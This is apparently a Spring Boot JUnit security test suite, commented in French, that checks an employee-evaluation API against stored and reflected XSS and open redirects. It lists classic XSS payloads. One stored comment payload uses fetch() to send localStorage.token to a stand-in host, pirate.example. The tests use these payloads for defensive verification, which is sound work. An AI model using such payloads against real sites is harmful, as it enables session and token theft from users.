package com.atb.employeeevaluation.security;

import com.atb.employeeevaluation.entity.Employe;
import com.atb.employeeevaluation.enums.Role;
import com.atb.employeeevaluation.enums.TypeAffectation;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockHttpServletResponse;

import java.util.HashMap;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;

/**
 * Cross-Site Scripting.
 *
 * La défense repose sur deux propriétés, et ces tests vérifient les deux.
 *
 * **Côté API** : toute réponse est du JSON produit par Jackson, jamais du HTML
 * assemblé à la main. Un `<` reste un `<` dans une chaîne JSON — inerte tant que
 * le client ne l'injecte pas dans le DOM. Le point réellement dangereux est le
 * `Content-Type` : si une réponse portant une charge sortait en `text/html`, le
 * navigateur l'exécuterait. C'est le contrôle central ici.
 *
 * **Côté Angular** : les gabarits interpolent avec `{{ }}`, ce qui échappe
 * systématiquement. Un seul composant emploie `bypassSecurityTrustHtml`
 * (lucide-icon), sur un dictionnaire d'icônes constant compilé dans le bundle —
 * aucune donnée serveur ne l'atteint. Un test dédié verrouille ce point, car
 * c'est la seule porte par laquelle du HTML pourrait entrer.
 *
 * On ne teste pas que le serveur « nettoie » les charges : il ne le fait pas, et
 * c'est correct. Assainir à l'écriture détruirait des données légitimes (un
 * commentaire d'évaluation peut contenir « note < 10 ») et donnerait une fausse
 * assurance. L'échappement se fait au rendu, là où le contexte est connu.
 */
@DisplayName("XSS")
class XssTest extends SecuriteTestBase {

    private static final String[] CHARGES = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "'-alert(1)-'",
            "<a href=\"javascript:alert(1)\">clic</a>",
            "</script><script>alert(1)</script>"
    };

    // ═══ Type de contenu ═════════════════════════════════════════════════════

    /**
     * Le contrôle décisif. Une charge stockée puis relue doit revenir en
     * `application/json`. En `text/html`, le navigateur exécuterait le script
     * dès l'ouverture directe de l'URL de l'API — sans même passer par Angular.
     */
    @Test
    @DisplayName("Une charge XSS stockée est restituée en JSON, jamais en HTML")
    void chargeStockeeRevientEnJson() throws Exception {
        for (String chargeBrute : CHARGES) {
            // La colonne « nom » est un VARCHAR(50) : on tronque pour que le test
            // porte sur l'encodage de la réponse et non sur la limite du schéma.
            // Une charge tronquée reste dangereuse — « <script>alert( » suffit à
            // ouvrir une balise si la réponse sortait en HTML.
            String charge = chargeBrute.length() > 50 ? chargeBrute.substring(0, 50) : chargeBrute;

            Employe piege = creerEmploye("XSS" + Math.abs(chargeBrute.hashCode() % 100000),
                    charge, "Test", Role.EMPLOYE, TypeAffectation.SIEGE, null, null);

            MockHttpServletResponse reponse = mockMvc.perform(authentifie(
                            get("/api/employes/{id}", piege.getId()), admin))
                    .andReturn().getResponse();

            assertThat(reponse.getStatus()).isEqualTo(200);
            assertThat(reponse.getContentType())
                    .as("Charge « %s » : un type HTML rendrait le script exécutable", charge)
                    .startsWith("application/json");

            // Jackson échappe les guillemets, ce qui empêche la charge de sortir
            // de la chaîne JSON — la seule évasion qui compte à ce niveau.
            String corps = reponse.getContentAsString();
            assertThat(corps)
                    .as("La charge ne doit pas rompre la structure JSON")
                    .doesNotContain("\"nom\":\"" + charge.replace("\"", "") + "\"><");

            objectMapper.readTree(corps); // Lève si la structure a été rompue.
        }
    }

    /**
     * Un message d'erreur reprend souvent l'entrée fautive. C'est un XSS réfléchi
     * classique : la charge n'est jamais stockée, elle revient dans la réponse.
     */
    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><svg/onload=alert(1)>"
    })
    @DisplayName("Un message d'erreur reprenant l'entrée reste du JSON")
    void erreurRefleteeResteEnJson(String charge) throws Exception {
        MockHttpServletResponse reponse = mockMvc.perform(authentifie(
                        get("/api/employes/matricule/{matricule}", charge), admin))
                .andReturn().getResponse();

        String type = reponse.getContentType();
        if (type != null) {
            assertThat(type)
                    .as("Charge réfléchie « %s »", charge)
                    .doesNotContain("text/html");
        }
        if (!reponse.getContentAsString().isBlank()) {
            objectMapper.readTree(reponse.getContentAsString());
        }
    }

    /**
     * Un commentaire d'évaluation est du texte long et libre : c'est le champ le
     * plus propice au XSS stocké dans cette application.
     */
    @Test
    @DisplayName("Un commentaire d'évaluation piégé traverse la base sans altération")
    void commentaireEvaluationResteLitteral() throws Exception {
        String charge = "<script>fetch('//pirate.example/'+localStorage.token)</script>";

        Map<String, Object> validation = new HashMap<>();
        validation.put("accepte", true);
        validation.put("commentaire", charge);

        mockMvc.perform(authentifie(
                        org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                                .patch("/api/fiches/{id}/n2", ficheAlice.getId()), n2Alice)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(validation)))
                .andReturn();

        var fiche = ficheRepository.findById(ficheAlice.getId()).orElseThrow();
        if (fiche.getCommentaireN2() != null) {
            // Conservation à l'identique : c'est voulu. L'échappement appartient
            // au rendu, pas au stockage — assainir ici mutilerait un commentaire
            // légitime contenant « < » ou « > ».
            assertThat(fiche.getCommentaireN2()).isEqualTo(charge);
        }

        MockHttpServletResponse relecture = mockMvc.perform(authentifie(
                        get("/api/fiches/{id}", ficheAlice.getId()), n2Alice))
                .andReturn().getResponse();

        if (relecture.getStatus() == 200) {
            assertThat(relecture.getContentType()).startsWith("application/json");
            objectMapper.readTree(relecture.getContentAsString());
        }
    }

    /**
     * Le nom de campagne est affiché sur presque tous les écrans, y compris dans
     * le contexte de l'assistant. Une charge y serait particulièrement diffusée.
     */
    @Test
    @DisplayName("Un nom de campagne piégé n'échappe pas à l'encodage JSON")
    void nomDeCampagnePiege() throws Exception {
        Map<String, Object> campagne = new HashMap<>();
        campagne.put("nomEvaluation", "<img src=x onerror=alert(1)>");
        campagne.put("dateDebut", java.time.LocalDateTime.now().plusDays(1).toString());
        campagne.put("dateFin", java.time.LocalDateTime.now().plusDays(30).toString());

        mockMvc.perform(authentifie(post("/api/evaluations"), admin)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(campagne)))
                .andReturn();

        MockHttpServletResponse liste = mockMvc.perform(authentifie(
                get("/api/evaluations"), admin)).andReturn().getResponse();

        assertThat(liste.getContentType()).startsWith("application/json");
        objectMapper.readTree(liste.getContentAsString());
    }

    // ═══ Redirection ouverte ═════════════════════════════════════════════════

    /**
     * `javascript:` dans un `routerLink` s'exécute au clic. L'assistant est la
     * seule voie par laquelle un chemin pourrait arriver du serveur, et il est
     * fermé par catalogue — ce test constate qu'aucune autre réponse ne transporte
     * de chemin arbitraire.
     */
    @Test
    @DisplayName("Aucune réponse ne transporte de chemin « javascript: » ou externe")
    void aucuneRedirectionOuverte() throws Exception {
        String[] points = {"/api/employes", "/api/evaluations", "/api/dashboard/stats", "/api/activites"};

        for (String point : points) {
            MockHttpServletResponse reponse = mockMvc.perform(authentifie(get(point), admin))
                    .andReturn().getResponse();

            if (reponse.getStatus() != 200) {
                continue;
            }
            String corps = reponse.getContentAsString();
            assertThat(corps)
                    .as("%s ne doit contenir aucun schéma exécutable", point)
                    .doesNotContain("javascript:")
                    .doesNotContain("data:text/html");
        }
    }

    /**
     * L'en-tête `Location` d'une redirection est suivi par le navigateur sans
     * interaction : un `javascript:` ou un domaine externe y serait direct.
     */
    @Test
    @DisplayName("Aucun en-tête Location ne pointe hors de l'application")
    void enTeteLocationResteInterne() throws Exception {
        MockHttpServletResponse reponse = mockMvc.perform(get("/api/auth/login")
                        .param("redirect", "https://pirate.example/vol"))
                .andReturn().getResponse();

        String location = reponse.getHeader("Location");
        if (location != null) {
            assertThat(location)
                    .doesNotContain("pirate.example")
                    .doesNotStartWith("javascript:");
        }
    }
}
